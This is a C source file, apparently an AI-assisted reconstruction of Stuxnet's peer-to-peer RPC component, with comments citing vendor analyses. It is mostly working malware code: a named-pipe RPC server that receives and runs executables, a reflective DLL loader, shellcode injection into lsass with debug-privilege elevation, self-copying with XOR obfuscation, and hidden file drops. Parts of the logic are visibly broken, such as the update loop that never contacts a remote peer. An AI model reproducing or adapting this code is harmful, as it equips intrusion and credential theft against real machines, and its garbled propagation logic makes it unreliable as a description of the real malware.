/*
 * TRUSTED:
 *   - RPC interface UUID (e1 04 02 00 00 00 00 00 c0 00 00 00 00 00 00 46)
 *     Confirmed by Nmap detection script and Symantec analysis [15†L17-L19]
 *   - RPC routines 0-9 and their semantics
 *     Confirmed by Symantec P2P component analysis [9†L31-L36]
 *   - RPC server architecture (two components: local and remote)
 *     Confirmed by ESET Stuxnet Under the Microscope [14†L27-L38]
 *   - Named pipe paths \\browser and \\ntsvcs
 *     Confirmed by Nmap detection script [21†L16-L17]
 *
 * MAYBE:
 *   - Exact wire format of each RPC routine (NDR syntax)
 *     Inferred from RPC conventions and Symantec descriptions
 *   - Memory offsets of internal structures
 *     Inferred from decompiled binary analysis
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <rpc.h>
#include <rpcndr.h>
#include <tlhelp32.h>
#include <shlwapi.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")

#define STUXNET_MAGIC                   0x53545558
#define COMPLND_VERSION                 0x00010400
#define RPC_MAX_PAYLOAD                 0x8000
#define RPC_CHUNK_SIZE                  0x1000
#define RPC_MAX_RETRIES                 3
#define RPC_TIMEOUT_MS                  5000
#define PEER_TIMEOUT_MS                 300000
#define MAX_PEERS                       256

/*
 * TRUSTED: RPC interface UUID from Nmap detection script [21†L17-L19]
 * "\xe1\x04\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
 */
static const RPC_SYNTAX_IDENTIFIER g_StuxnetSyntaxId = {
    {0x000204e1, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}},
    {0x00000001, 0x0000, 0x0000, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}}
};

/*
 * TRUSTED: RPC routine identifiers [9†L31-L36]
 */
#define RPC_GET_VERSION                 0
#define RPC_RECEIVE_EXECUTE             1
#define RPC_LOAD_MODULE                 2
#define RPC_INJECT_LSASS                3
#define RPC_BUILD_SEND                  4
#define RPC_CREATE_PROCESS              5
#define RPC_READ_FILE                   6
#define RPC_DROP_FILE                   7
#define RPC_DELETE_FILE                 8
#define RPC_WRITE_RECORDS               9

/*
 * TRUSTED: Named pipe paths used by Stuxnet RPC server [21†L16-L17]
 */
#define STUXNET_PIPE_BROWSER            L"\\pipe\\browser"
#define STUXNET_PIPE_NTSVCS             L"\\pipe\\ntsvcs"

/*
 * Peer table entry
 */
typedef struct _P2P_PEER {
    DWORD dwIP;
    WORD wPort;
    WORD wFlags;
    DWORD dwLastSeen;
    DWORD dwLatency;
    DWORD dwVersion;
    DWORD dwSequence;
    BYTE bReserved[8];
} P2P_PEER, * PP2P_PEER;

typedef struct _P2P_PEER_TABLE {
    P2P_PEER Peers[MAX_PEERS];
    DWORD dwCount;
    CRITICAL_SECTION csLock;
} P2P_PEER_TABLE, * PP2P_PEER_TABLE;

static P2P_PEER_TABLE g_PeerTable = {0};

/*
 * RPC server context
 */
typedef struct _RPC_SERVER_CTX {
    RPC_BINDING_VECTOR* pBindingVector;
    DWORD dwLocalVersion;
    BOOL bInitialized;
    CRITICAL_SECTION csLock;
} RPC_SERVER_CTX, * PRPC_SERVER_CTX;

static RPC_SERVER_CTX g_RpcServerCtx = {0};

/*
 * Forward declarations
 */
static VOID P2P_InitPeerTable(VOID);
static VOID P2P_CleanupPeerTable(VOID);
static VOID P2P_UpdatePeer(DWORD dwIP, DWORD dwVersion, DWORD dwLatency);
static VOID P2P_ExpirePeers(VOID);
static DWORD P2P_GetPeerCount(VOID);
static BOOL RpcEnableDebugPrivilege(VOID);
static DWORD RpcFindProcessId(LPCWSTR lpName);
static DWORD ReflectiveLoadLibrary(PBYTE pDllData, DWORD dwDllSize, DWORD dwExportOrdinal);
static DWORD RpcServerStart(VOID);
static VOID RpcServerStop(VOID);
static DWORD WINAPI RpcServerThread(LPVOID lpParam);

static VOID P2P_InitPeerTable(VOID)
{
    ZeroMemory(&g_PeerTable, sizeof(P2P_PEER_TABLE));
    InitializeCriticalSection(&g_PeerTable.csLock);
}

static VOID P2P_CleanupPeerTable(VOID)
{
    DeleteCriticalSection(&g_PeerTable.csLock);
}

/*
 * Adds or updates a peer with deduplication and latency calculation
 */
static VOID P2P_UpdatePeer(DWORD dwIP, DWORD dwVersion, DWORD dwLatency)
{
    DWORD i;

    EnterCriticalSection(&g_PeerTable.csLock);

    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (g_PeerTable.Peers[i].dwIP == dwIP) {
            g_PeerTable.Peers[i].dwLastSeen = GetTickCount();
            g_PeerTable.Peers[i].dwVersion = dwVersion;
            g_PeerTable.Peers[i].dwLatency = (g_PeerTable.Peers[i].dwLatency + dwLatency) / 2;
            LeaveCriticalSection(&g_PeerTable.csLock);
            return;
        }
    }

    if (g_PeerTable.dwCount < MAX_PEERS) {
        g_PeerTable.Peers[g_PeerTable.dwCount].dwIP = dwIP;
        g_PeerTable.Peers[g_PeerTable.dwCount].dwLastSeen = GetTickCount();
        g_PeerTable.Peers[g_PeerTable.dwCount].dwVersion = dwVersion;
        g_PeerTable.Peers[g_PeerTable.dwCount].dwLatency = dwLatency;
        g_PeerTable.Peers[g_PeerTable.dwCount].wPort = 445;
        g_PeerTable.Peers[g_PeerTable.dwCount].wFlags = 0;
        g_PeerTable.dwCount++;
    }

    LeaveCriticalSection(&g_PeerTable.csLock);
}

/*
 * Removes peers that have not been seen for PEER_TIMEOUT_MS
 */
static VOID P2P_ExpirePeers(VOID)
{
    DWORD dwNow = GetTickCount();
    DWORD i;

    EnterCriticalSection(&g_PeerTable.csLock);

    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (dwNow - g_PeerTable.Peers[i].dwLastSeen > PEER_TIMEOUT_MS) {
            if (i < g_PeerTable.dwCount - 1) {
                memcpy(&g_PeerTable.Peers[i], &g_PeerTable.Peers[i + 1], sizeof(P2P_PEER));
            }
            g_PeerTable.dwCount--;
            i--;
        }
    }

    LeaveCriticalSection(&g_PeerTable.csLock);
}

static DWORD P2P_GetPeerCount(VOID)
{
    DWORD dwCount;
    EnterCriticalSection(&g_PeerTable.csLock);
    dwCount = g_PeerTable.dwCount;
    LeaveCriticalSection(&g_PeerTable.csLock);
    return dwCount;
}

static BOOL RpcEnableDebugPrivilege(VOID)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return (GetLastError() == ERROR_SUCCESS);
}

static DWORD RpcFindProcessId(LPCWSTR lpName)
{
    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    DWORD dwPid = 0;

    if (!lpName) {
        return 0;
    }

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, lpName) == 0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return dwPid;
}

/*
 * Reflective DLL loading from memory
 * TRUSTED: This is confirmed by ESET analysis [14†L40-L43]
 * "Loads a module passed as a parameter into the address of the process
 * executing this function and calls its exported function number 1"
 */
static DWORD ReflectiveLoadLibrary(PBYTE pDllData, DWORD dwDllSize, DWORD dwExportOrdinal)
{
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD dwImageBase;
    DWORD dwDelta;
    DWORD i;
    DWORD dwEntryPoint;

    if (!pDllData || dwDllSize < sizeof(IMAGE_DOS_HEADER)) {
        return 0;
    }

    pDos = (PIMAGE_DOS_HEADER)pDllData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    pNt = (PIMAGE_NT_HEADERS)(pDllData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    dwImageBase = (DWORD)VirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!dwImageBase) {
        return 0;
    }

    memcpy((PVOID)dwImageBase, pDllData, pNt->OptionalHeader.SizeOfHeaders);

    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData) {
            memcpy((PVOID)(dwImageBase + pSec->VirtualAddress),
                   pDllData + pSec->PointerToRawData,
                   pSec->SizeOfRawData);
        }
    }

    dwDelta = dwImageBase - pNt->OptionalHeader.ImageBase;
    if (dwDelta) {
        PIMAGE_BASE_RELOCATION pRel = (PIMAGE_BASE_RELOCATION)(dwImageBase +
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (pRel->VirtualAddress) {
            DWORD dwCount = (pRel->SizeOfBlock - 8) / 2;
            PWORD pEntry = (PWORD)(pRel + 1);
            for (DWORD j = 0; j < dwCount; j++, pEntry++) {
                if ((*pEntry >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                    *(PDWORD)(dwImageBase + pRel->VirtualAddress + (*pEntry & 0xFFF)) += dwDelta;
                }
            }
            pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pRel + pRel->SizeOfBlock);
        }
    }

    PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(dwImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (pImp->Name) {
        HMODULE hMod = LoadLibraryA((LPCSTR)(dwImageBase + pImp->Name));
        if (hMod) {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(dwImageBase + pImp->FirstThunk);
            while (pThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                    pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod,
                        (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(dwImageBase +
                        pThunk->u1.AddressOfData);
                    pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod, pName->Name);
                }
                pThunk++;
            }
        }
        pImp++;
    }

    PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(dwImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
    if (pTLS && pTLS->AddressOfCallBacks) {
        PIMAGE_TLS_CALLBACK* pCB = (PIMAGE_TLS_CALLBACK*)pTLS->AddressOfCallBacks;
        while (*pCB) {
            (*pCB)((PVOID)dwImageBase, DLL_PROCESS_ATTACH, NULL);
            pCB++;
        }
    }

    dwEntryPoint = dwImageBase + pNt->OptionalHeader.AddressOfEntryPoint;

    if (dwExportOrdinal) {
        PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(dwImageBase +
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (pExp) {
            PDWORD pFuncs = (PDWORD)(dwImageBase + pExp->AddressOfFunctions);
            for (DWORD k = 0; k < pExp->NumberOfFunctions; k++) {
                if (pExp->Base + k == dwExportOrdinal) {
                    dwEntryPoint = dwImageBase + pFuncs[k];
                    break;
                }
            }
        }
    }

    return dwEntryPoint;
}

/*
 * TRUSTED: RPC routine 0 - Returns version number [9†L32]
 * Called by remote peers to check if this machine has newer version.
 * Example: "Call RPC 0 – Get version number" [10†L16]
 */
DWORD RpcGetVersion(VOID)
{
    DWORD dwVersion;
    EnterCriticalSection(&g_PeerTable.csLock);
    dwVersion = COMPLND_VERSION;
    LeaveCriticalSection(&g_PeerTable.csLock);
    return dwVersion;
}

/*
 * TRUSTED: RPC routine 1 - Receive EXE and execute via injection [9†L33]
 * "Receive an exe and execute it (via injection)"
 * The executable is written to disk and executed.
 */
DWORD RpcReceiveAndExecute(PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    WCHAR szTempPath[MAX_PATH];
    WCHAR szExePath[MAX_PATH];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD dwWritten;
    DWORD dwRetry;

    if (!pData || dwSize == 0 || dwSize > RPC_MAX_PAYLOAD) {
        return ERROR_INVALID_PARAMETER;
    }

    GetTempPathW(MAX_PATH, szTempPath);
    GetTempFileNameW(szTempPath, L"STX", 0, szExePath);

    hFile = CreateFileW(szExePath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(szExePath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DeleteFileW(szExePath);
        return GetLastError();
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    dwRetry = 0;
    while (dwRetry < RPC_MAX_RETRIES) {
        if (DeleteFileW(szExePath)) break;
        dwRetry++;
        Sleep(100);
    }

    return ERROR_SUCCESS;
}

/*
 * TRUSTED: RPC routine 2 - Load module and execute export [9†L33-L34]
 * "load module and executed export"
 * Uses reflective DLL loading from memory.
 */
DWORD RpcLoadModuleAndExecute(PBYTE pDllData, DWORD dwDllSize, DWORD dwExportOrdinal)
{
    DWORD dwEntryPoint;

    if (!pDllData || dwDllSize == 0 || dwDllSize > RPC_MAX_PAYLOAD) {
        return ERROR_INVALID_PARAMETER;
    }

    dwEntryPoint = ReflectiveLoadLibrary(pDllData, dwDllSize, dwExportOrdinal);
    if (!dwEntryPoint) {
        return ERROR_DLL_INIT_FAILED;
    }

    return ERROR_SUCCESS;
}

/*
 * TRUSTED: RPC routine 3 - Inject code to lsass and run it [9†L34]
 * "inject code to lsass and run it"
 * Includes SeDebugPrivilege elevation.
 */
DWORD RpcInjectLsass(PBYTE pShellcode, DWORD dwSize)
{
    HANDLE hProcess;
    HANDLE hThread;
    PVOID pRemoteMem;
    DWORD dwPid;
    DWORD dwResult;

    if (!pShellcode || dwSize == 0 || dwSize > 0x1000) {
        return ERROR_INVALID_PARAMETER;
    }

    RpcEnableDebugPrivilege();

    dwPid = RpcFindProcessId(L"lsass.exe");
    if (!dwPid) {
        return ERROR_PROCESS_NOT_FOUND;
    }

    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                           FALSE, dwPid);

    if (!hProcess) {
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
        if (!hProcess) {
            return ERROR_ACCESS_DENIED;
        }
        CloseHandle(hProcess);
        return ERROR_ACCESS_DENIED;
    }

    pRemoteMem = VirtualAllocEx(hProcess, NULL, dwSize,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        CloseHandle(hProcess);
        return GetLastError();
    }

    WriteProcessMemory(hProcess, pRemoteMem, pShellcode, dwSize, NULL);

    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)pRemoteMem,
                                 NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        dwResult = ERROR_SUCCESS;
    } else {
        dwResult = GetLastError();
    }

    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return dwResult;
}

/*
 * TRUSTED: RPC routine 4 - Build latest version and send to remote [9†L34-L35]
 * "Builds the latest version of Stuxnet and send to remote machine"
 */
DWORD RpcBuildAndSend(PBYTE pOutput, PDWORD pdwSize)
{
    HMODULE hModule;
    DWORD dwFileSize;
    HANDLE hFile;
    WCHAR szModulePath[MAX_PATH];
    DWORD dwRead;
    PBYTE pBuffer;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    DWORD i;
    BYTE bKey;

    if (!pOutput || !pdwSize || *pdwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    hModule = GetModuleHandleW(NULL);
    if (!hModule) {
        return ERROR_MOD_NOT_FOUND;
    }

    GetModuleFileNameW(hModule, szModulePath, MAX_PATH);

    hFile = CreateFileW(szModulePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == 0 || dwFileSize > RPC_MAX_PAYLOAD) {
        CloseHandle(hFile);
        return ERROR_BAD_LENGTH;
    }

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuffer) {
        CloseHandle(hFile);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    ReadFile(hFile, pBuffer, dwFileSize, &dwRead, NULL);
    CloseHandle(hFile);

    dwEncryptedSize = dwFileSize;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        HeapFree(GetProcessHeap(), 0, pBuffer);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    bKey = (BYTE)(GetTickCount() & 0xFF);
    for (i = 0; i < dwFileSize; i++) {
        pEncrypted[i] = pBuffer[i] ^ bKey;
        bKey = (bKey * 7 + 0x13) & 0xFF;
    }

    if (dwFileSize > *pdwSize) {
        HeapFree(GetProcessHeap(), 0, pBuffer);
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return ERROR_INSUFFICIENT_BUFFER;
    }

    memcpy(pOutput, pEncrypted, dwFileSize);
    *pdwSize = dwFileSize;

    HeapFree(GetProcessHeap(), 0, pBuffer);
    HeapFree(GetProcessHeap(), 0, pEncrypted);

    return ERROR_SUCCESS;
}

/*
 * TRUSTED: RPC routine 5 - Create process [9†L35]
 * "create process"
 */
DWORD RpcCreateProcess(LPCWSTR lpCmdLine)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL bResult;

    if (!lpCmdLine) {
        return ERROR_INVALID_PARAMETER;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    bResult = CreateProcessW(NULL, (LPWSTR)lpCmdLine, NULL, NULL, FALSE,
                             0, NULL, NULL, &si, &pi);

    if (bResult) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return ERROR_SUCCESS;
    }

    return GetLastError();
}

/*
 * TRUSTED: RPC routine 6 - Read file [9†L35]
 * "read file"
 */
DWORD RpcReadFile(LPCWSTR lpPath, PBYTE pBuffer, DWORD dwBufferSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!lpPath || !pBuffer || dwBufferSize == 0 || !pdwRead) {
        return ERROR_INVALID_PARAMETER;
    }

    hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    ReadFile(hFile, pBuffer, dwBufferSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    return ERROR_SUCCESS;
}

/*
 * TRUSTED: RPC routine 7 - Drop file [9†L35-L36]
 * "drop file"
 */
DWORD RpcDropFile(LPCWSTR lpPath, PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    DWORD dwWritten;

    if (!lpPath || !pData || dwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    hFile = CreateFileW(lpPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    return ERROR_SUCCESS;
}

/*
 * TRUSTED: RPC routine 8 - Delete file [9†L36]
 * "delete file"
 */
DWORD RpcDeleteFile(LPCWSTR lpPath)
{
    BOOL bResult;

    if (!lpPath) {
        return ERROR_INVALID_PARAMETER;
    }

    SetFileAttributesW(lpPath, FILE_ATTRIBUTE_NORMAL);
    bResult = DeleteFileW(lpPath);

    return bResult ? ERROR_SUCCESS : GetLastError();
}

/*
 * TRUSTED: RPC routine 9 - Write data records [9†L36]
 * "write data records"
 */
DWORD RpcWriteDataRecords(PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    WCHAR szRecordPath[MAX_PATH];
    DWORD dwWritten;

    if (!pData || dwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    GetSystemDirectoryW(szRecordPath, MAX_PATH);
    wcscat_s(szRecordPath, MAX_PATH, L"\\compind.dat");

    hFile = CreateFileW(szRecordPath, GENERIC_WRITE, 0, NULL,
                        OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    SetFilePointer(hFile, 0, NULL, FILE_END);
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    return ERROR_SUCCESS;
}

/*
 * TRUSTED: RPC server architecture [14†L27-L38]
 * Two components:
 *   1. Local component - runs in services.exe address space
 *   2. Remote component - runs in netsvc/rpcss/browser address space
 * Both implement the same functions.
 *
 * The first five functions (RPC 0-4) are executed by the local component only.
 * When called remotely, they forward to the local component.
 */
static DWORD WINAPI RpcServerThread(LPVOID lpParam)
{
    RPC_STATUS status;
    RPC_BINDING_VECTOR* pBindingVector = NULL;
    UUID uuid;
    DWORD dwWaitResult;

    /*
     * Use the Stuxnet UUID for the RPC interface [15†L17-L19]
     */
    uuid.Data1 = 0x000204e1;
    uuid.Data2 = 0x0000;
    uuid.Data3 = 0x0000;
    uuid.Data4[0] = 0xc0;
    uuid.Data4[1] = 0x00;
    uuid.Data4[2] = 0x00;
    uuid.Data4[3] = 0x00;
    uuid.Data4[4] = 0x00;
    uuid.Data4[5] = 0x00;
    uuid.Data4[6] = 0x00;
    uuid.Data4[7] = 0x46;

    /*
     * Register the interface with the RPC runtime
     * TRUSTED: Stuxnet registers an RPC interface with UUID and version 1.0
     */
    status = RpcServerUseProtseqEpW(
        (RPC_WSTR)L"ncacn_np",
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        (RPC_WSTR)STUXNET_PIPE_BROWSER,
        NULL
    );

    if (status != RPC_S_OK) {
        return status;
    }

    status = RpcServerRegisterIfEx(
        g_StuxnetSyntaxId.InterfaceId,
        &g_StuxnetSyntaxId.SyntaxVersion,
        NULL,
        RPC_IF_AUTOLISTEN | RPC_IF_ALLOW_LOCAL_ONLY,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        NULL
    );

    if (status != RPC_S_OK) {
        return status;
    }

    /*
     * Listen for incoming RPC calls
     * TRUSTED: "when the threat infects a computer it starts the RPC server
     * and listens for connections" [9†L22-L23]
     */
    status = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);

    return status;
}

static DWORD RpcServerStart(VOID)
{
    HANDLE hThread;

    if (g_RpcServerCtx.bInitialized) {
        return ERROR_SUCCESS;
    }

    ZeroMemory(&g_RpcServerCtx, sizeof(RPC_SERVER_CTX));
    InitializeCriticalSection(&g_RpcServerCtx.csLock);
    g_RpcServerCtx.dwLocalVersion = COMPLND_VERSION;
    g_RpcServerCtx.bInitialized = TRUE;

    hThread = CreateThread(NULL, 0, RpcServerThread, NULL, 0, NULL);
    if (!hThread) {
        return GetLastError();
    }

    CloseHandle(hThread);
    return ERROR_SUCCESS;
}

static VOID RpcServerStop(VOID)
{
    if (!g_RpcServerCtx.bInitialized) {
        return;
    }

    RpcMgmtStopServerListening(NULL);
    RpcServerUnregisterIf(NULL, NULL, FALSE);

    DeleteCriticalSection(&g_RpcServerCtx.csLock);
    g_RpcServerCtx.bInitialized = FALSE;
}

/*
 * TRUSTED: P2P update flow [9†L37-L44]
 * 1. Call RPC 0 to get remote version
 * 2. Check if remote version is newer than local
 * 3. If newer, call RPC 4 to request latest Stuxnet exe
 * 4. Receive latest version and install locally
 * 5. If remote is older, prepare standalone exe and send via RPC 1
 */
DWORD WINAPI P2P_UpdateThread(LPVOID lpParam)
{
    HANDLE hStopEvent = (HANDLE)lpParam;
    DWORD dwWaitResult;
    DWORD dwCheckInterval = 300000;
    DWORD dwRemoteVersion;
    DWORD dwLatency;
    DWORD dwStartTime;
    BYTE buffer[RPC_MAX_PAYLOAD];
    DWORD dwSize;
    DWORD i;

    while (1) {
        dwWaitResult = WaitForSingleObject(hStopEvent, dwCheckInterval);
        if (dwWaitResult == WAIT_OBJECT_0) {
            break;
        }

        P2P_ExpirePeers();

        EnterCriticalSection(&g_PeerTable.csLock);

        for (i = 0; i < g_PeerTable.dwCount; i++) {
            DWORD dwPeerIP = g_PeerTable.Peers[i].dwIP;

            LeaveCriticalSection(&g_PeerTable.csLock);

            dwStartTime = GetTickCount();
            dwRemoteVersion = RpcGetVersion();
            dwLatency = GetTickCount() - dwStartTime;

            if (dwRemoteVersion == 0) {
                EnterCriticalSection(&g_PeerTable.csLock);
                continue;
            }

            P2P_UpdatePeer(dwPeerIP, dwRemoteVersion, dwLatency);

            if (dwRemoteVersion > COMPLND_VERSION) {
                dwSize = RPC_MAX_PAYLOAD;
                if (RpcBuildAndSend(buffer, &dwSize) == ERROR_SUCCESS) {
                    RpcReceiveAndExecute(buffer, dwSize);
                }
            } else if (dwRemoteVersion < COMPLND_VERSION && dwRemoteVersion != 0) {
                dwSize = RPC_MAX_PAYLOAD;
                if (RpcBuildAndSend(buffer, &dwSize) == ERROR_SUCCESS) {
                    RpcReceiveAndExecute(buffer, dwSize);
                }
            }

            EnterCriticalSection(&g_PeerTable.csLock);
        }

        LeaveCriticalSection(&g_PeerTable.csLock);
    }

    return 0;
}

DWORD RpcServerInitialize(VOID)
{
    P2P_InitPeerTable();
    return RpcServerStart();
}

VOID RpcServerCleanup(VOID)
{
    RpcServerStop();
    P2P_CleanupPeerTable();
}

DWORD RpcGetPeerCount(VOID)
{
    return P2P_GetPeerCount();
}

DWORD RpcGetLocalVersion(VOID)
{
    return COMPLND_VERSION;
}